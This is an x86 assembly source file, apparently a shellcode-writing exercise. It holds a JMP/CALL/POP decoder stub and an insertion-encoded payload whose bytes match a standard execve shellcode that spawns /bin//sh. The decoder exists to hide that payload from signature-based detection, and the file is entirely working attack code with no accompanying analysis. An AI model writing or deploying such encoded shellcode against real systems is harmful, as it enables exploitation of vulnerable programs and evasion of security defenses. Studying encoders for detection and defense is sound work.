global _start			

section .text
_start:
	jmp short call_shellcode	;; JMP/CALL/POP technique for getting location of the EncodedShellcode

decoder:
	pop esi				;; Store address of EncodedShellcode in ESI
	lea edi, [esi + 1]		;; Store position to store next real byte in EDI

	push 0x54			;; Push length of EncodedShellcode
	pop ecx				;; Store length in ECX

	xor eax, eax			;; Clear EAX
	mov al, 1			;; Store index of byte to analyze from EncodedShellcode in EAX

	xor ebx, ebx			;; Clear EBX
	xor edx, edx			;; Clear EDX
decode: 
	cmp eax, ecx			;; Check to see if we're at the end of the EncodedShellcode
	jge short EncodedShellcode	;; Jump to EncodedShellcode if we're at the end (decoding should be complete)

	mov bl, byte [esi + eax]	;; Store current byte to analyze in EBX

	cmp dl, 1			;; Check if we need to analyze 2 bytes
	jnz short decode1			;; Skip checking the previous byte (means the above comparison didn't result in ZF being set)
	add bl, byte [esi + eax - 1]	;; Add previous byte to current byte (sum the 2 bytes)
decode1:
	test bl, 1			;; Check if the value in EBX is odd (lowest bit would be set if odd)
	jnz short decode2 			;; Jump to skip setting EDX to 1 if Odd
	mov dl, 1			;; Store 1 in EDX (representing next iteration needs to analyze 2 bytes)
	jmp short decode3			;; Jump to skip setting EDX to 0
decode2:
	dec dl				;; Reset EDX to 0

decode3:
	mov bl, [esi + eax + 1]		;; Store next byte of EncodedShellcode into EBX
	mov byte [edi], bl		;; Store byte in EBX at position pointed to by EDI

	cmp dl, 1			;; Check if we need to analyze 2 bytes next time ()
	jnz short decode4			;; Skip additional EAX increment if odd (Odd numbers = skip 2 bytes, Even numbers = skip 3 bytes)
	inc eax				;; Increment EAX
decode4:

	add al, 2			;; Add 2 to EAX
	inc edi				;; Move EDI forward (pointing to next place to store real shellcode byte)
	jmp short decode		;; Jump to start of decode loop

call_shellcode:

	call decoder
	EncodedShellcode: db 0x31, 0x5c, 0xc0, 0xd2, 0x35, 0x50, 0x3f, 0x68, 0x0a, 0x6e, 0x9b, 0xcd, 0x66, 0xfb, 0xf6, 0x69, 0xd7, 0x67, 0x19, 0x68, 0x31, 0x69, 0x26, 0x66, 0xff, 0x1d, 0x63, 0xcb, 0xda, 0x6f, 0xa7, 0x68, 0xf1, 0x62, 0x10, 0x69, 0xc0, 0x9d, 0x6e, 0x7f, 0x2f, 0x30, 0x68, 0x05, 0xa4, 0x2f, 0x1b, 0x2f, 0x13, 0x2f, 0x64, 0x73, 0x25, 0x59, 0x89, 0xdb, 0x77, 0xe3, 0xd8, 0x0e, 0x50, 0x14, 0xc8, 0x89, 0x3a, 0x36, 0xe2, 0x4f, 0x0a, 0x53, 0xc5, 0x89, 0x47, 0xe1, 0xc6, 0xb0, 0x95, 0x3c, 0x0b, 0x54, 0xcd, 0x97, 0x55, 0x80
